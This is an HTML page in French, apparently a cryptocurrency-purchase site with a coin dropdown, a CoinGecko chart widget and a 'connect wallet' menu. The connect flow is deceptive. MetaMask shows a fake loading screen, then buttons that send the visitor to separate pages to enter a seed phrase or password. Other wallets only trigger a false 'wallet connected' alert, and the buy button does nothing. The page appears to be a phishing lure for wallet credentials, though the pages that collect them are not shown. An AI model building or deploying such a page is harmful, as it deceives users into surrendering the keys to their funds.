<html lang="en">
<head>

</head>
<body>

    <header class="header-bar">
        <div class="logo-container">

        <nav>
            <ul class="nav-links">
                <li><a href="#">Nous contacter</a></li>

                <li><a href="#">Consulting</a></li>
                <li><a href="#">CoinGecko listing</a></li>
            </ul>
        </nav>
    </header>

    <div class="container">
        <div class="buy-crypto">
            <h2>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Acheter des crypto Web3</h2>
            <div class="buy-container">
                <div class="buy-card">
                    <div class="crypto-select">
                        <label for="crypto-dropdown">Choisissez une crypto-monnaie</label>
                        <select id="crypto-dropdown" class="crypto-dropdown">
                            <option value="btc">Bitcoin (BTC)</option>
                            <option value="eth">Ethereum (ETH)</option>
                            <option value="bnb">Binance Coin (BNB)</option>
                            <option value="ada">Cardano (ADA)</option>
                            <option value="sol">Solana (SOL)</option>
                            <option value="doge">Dogecoin (DOGE)</option>
                            <option value="xrp">Ripple (XRP)</option>
                            <option value="ltc">Litecoin (LTC)</option>
                            <option value="dot">Polkadot (DOT)</option>
                            <option value="uni">Uniswap (UNI)</option>
                        </select>
                    </div>
                    <div class="crypto-info">
                        <input type="number" id="amount" class="amount-input" placeholder="Montant" />
                        <input type="text" id="usd" class="convert-input" placeholder="Valeur en $" readonly />
                        <button class="buy-button">Acheter</button>
                    </div>
                </div>

<div class="ranking">
    <div class="price-table-widget">
        <script src="https://widgets.coingecko.com/coingecko-coin-price-chart-widget.js"></script>
        <coingecko-coin-price-chart-widget coin-id="bitcoin" currency="usd" locale="fr">
        </coingecko-coin-price-chart-widget>
    </div>
</div>

<!-- Bouton Connecter un wallet en dehors du conteneur -->
<button class="buy-buttons" onclick="showWalletOptions()">Connecter un wallet</button>
</div>

<script>
    function showWalletOptions() {
	document.querySelector('.buy-buttons').style.display = 'none';
        // Afficher les options de wallet
        document.querySelector('.wallet-options').style.display = 'flex';
        
        // Masquer le bouton Connecter un wallet
        document.getElementById('connectWalletButton').style.display = 'none';
    }

    function connectWallet(walletType) {
        // Cacher les options de wallet
        document.querySelector('.wallet-options').style.display = 'none';

        if (walletType === 'metamask') {
            document.getElementById('loading').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('email-entry').style.display = 'block';
            }, 2000); // 2 seconds loading time
        } else {
            alert(walletType + ' wallet connected.');
        }
    }

    document.addEventListener("DOMContentLoaded", function() {
        // S'assurer que le bouton fonctionne bien
        const connectButton = document.getElementById('connectWalletButton');
        if (!connectButton) {
            console.error("Le bouton 'Connecter un wallet' n'a pas été trouvé.");
        }
    });
</script>

<!-- Wallet Options -->
        <div class="wallet-options">
            <div class="wallet-buttons" onclick="connectWallet('metamask')"
                <span>&emsp;&emsp;MetaMask</span>
            </div>
            <div class="wallet-buttons" onclick="connectWallet('Binance')">
                
                <span>Binance Wallet</span>
            </div>
            <div class="wallet-buttons" onclick="connectWallet('Coinbase')">
                
                <span>Coinbase Wallet</span>
            </div>
            <div class="wallet-buttons" onclick="connectWallet('Fortmatic')">
                
                <span>Fortmatic</span>
            </div>
		<div class="wallet-buttons" onclick="connectWallet('Alphawallet')">
                
                <span>AlphaWallet</span>
        </div>
    </div>
<!-- Loading Screen -->
        <div id="loading" class="loading-screens">
    <div class="loader"></div>
</div>
</div>

        <!-- Email Entry -->
        <div id="email-entry" class="email-entry">
            <h3>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Connexion au wallet via :</h3>
           <pre> 
            &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<button class="submit-button" onclick="redirectToSeedPage()">Seed phrase</button>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<button class="submit-button" onclick="redirectToMdpPage()">Mot de passe</button>
</pre>
        </div>
    </div>

<script>
    function redirectToSeedPage() {
        // Redirige l'utilisateur vers une autre page
        window.location.href = 'Page_21.html'; // Remplacez 'votre-page-seed-phrase.html' par l'URL de la page cible
    }
     function redirectToMdpPage() {
	window.location.href = '../Page 2/Page_2.html';
     }
</script>

    <div class="widget">

            coins="bitcoin,ethereum,ripple,litecoin,cardano"

</div>

</html>
